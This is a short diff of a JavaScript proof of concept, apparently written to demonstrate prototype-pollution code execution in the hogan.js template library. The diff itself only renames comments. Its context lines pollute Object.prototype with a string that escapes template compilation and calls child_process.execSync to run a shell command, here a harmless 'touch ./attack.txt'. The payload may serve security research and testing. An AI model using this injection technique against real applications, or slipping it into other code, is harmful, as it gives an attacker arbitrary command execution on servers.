@@ -1,13 +1,13 @@
 const hogan = require("hogan.js");
 
 
-/* Payload Injection*/
+/* Polluted Payload*/
 // inject property to root prototype
 Object.prototype.asString = '1';
 Object.prototype.name = '2';
 Object.prototype.inject = "},flag:process.mainModule.require(`child_process`).execSync(`touch ./attack.txt`).toString()}}//"
 
-/* Test Application Part*/
+/* Exported Function Call*/
 const TEMPLATE = `
 <p1>Template</p1>
 `;
